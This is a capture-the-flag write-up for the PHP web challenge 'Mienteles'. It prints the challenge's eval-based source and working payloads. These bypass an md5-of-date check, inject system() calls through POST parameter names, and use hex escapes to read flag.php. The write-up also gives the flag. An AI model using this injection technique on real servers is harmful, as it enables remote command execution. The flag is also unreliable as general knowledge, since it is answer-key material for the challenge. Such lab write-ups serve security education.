# Mienteles

## Description

Author: <strong>puck</strong>

Welcome to Mienteles. We are a telecommunications company from Latin America. We have a bug bounty program through which we dont pay for critical vulnerabilities, but at least you can win a flag: <a href="https://mienteles.ctf.cert.unlp.edu.ar/">Link</a> 

[Challenge](https://mienteles.ctf.cert.unlp.edu.ar/)<br>
[Mirror](https://mienteles-mirror.mirror-ctf.cert.unlp.edu.ar/)<br>
[Source](https://mienteles.ctf.cert.unlp.edu.ar/?src)

## Solution

```php
<?php

if (isset($_GET['src'])) {
    highlight_file(__FILE__);
    die();
}
?>
...
<div class="card-body">
    <h5 class="card-title">Flag</h5>
    <p class="card-text">Aquí estará tu flag: </p>
    <!-- Accede a ?src -->
    <?php
    error_reporting(0);
    if ($_POST['keyl'] == md5(date('Y-m-d'))) {
        foreach ($_POST as $name => $value) {
            $assign = "\$" . $name . "='" . preg_replace('([^A-Za-z0-9@. _-])', '', $value) . "';";
            eval($assign);
        }
    } else {
        echo "No podes hackearme";
    }
    ?>
</div>
...
```

The php code basically allows us to create variables, if string `$name=value` is evaluated then we can have access to `$name` in the code. 

One other thing to take note of is `"` (double quotes), in PHP double quotes allows string interpolation so to avoid disgusting string concatination and use beautiful "format strings" you can include variables in `{}`.

```php
└─$ php -a
Interactive shell

php > $name="Ryan";
php > echo "Hello {$name}";
Hello Ryan
```

Let's get cooking D:

First let's bypass the md5 hash check:

```py
>>> from hashlib import md5
>>> from datetime import date
>>> md5(str(date.today()).encode()).hexdigest()
'6bde8c88ffee17ea27c8e281299dcf47'
>>>
```

Nice, now the actual payload. We can't sneak any variable into `value` due to heavy filtering, but what about name?

Payload: `keyl=6bde8c88ffee17ea27c8e281299dcf47&{system("ls")}=1`

![mienteles-1](/assets/ctf/metared/mienteles-1.png)

Great we got command execution!

Now we need to `cat` the file, the problem is how php transforms the data <https://www.php.net/manual/en/language.variables.external.php#81080>.

> The full list of field-name characters that PHP converts to _ (underscore) is the following (not just dot):<br>
> chr(32) ( ) (space)<br>
> chr(46) (.) (dot)<br>
> chr(91) ([) (open square bracket)<br>
> chr(128) - chr(159) (various)<br>
> <br>
> PHP irreversibly modifies field names containing these characters in an attempt to maintain compatibility with the deprecated register_globals feature.

We cannot URLEncode our payload because it will be decoded and php will still convert it to underscores. What we can do is use hex codes, because they will not be decoded until they are inside the `system` call.

0x20 -> Space<br>
0x2E -> Dot

Payload: `keyl=6bde8c88ffee17ea27c8e281299dcf47&{system("cat\x20flag\x2Ephp")}=1`

![mienteles-2](/assets/ctf/metared/mienteles-2.png)
::: tip Flag
`flag{N1c3!No_B0untY_But_Th1s_1s_ur_fl4G}`
:::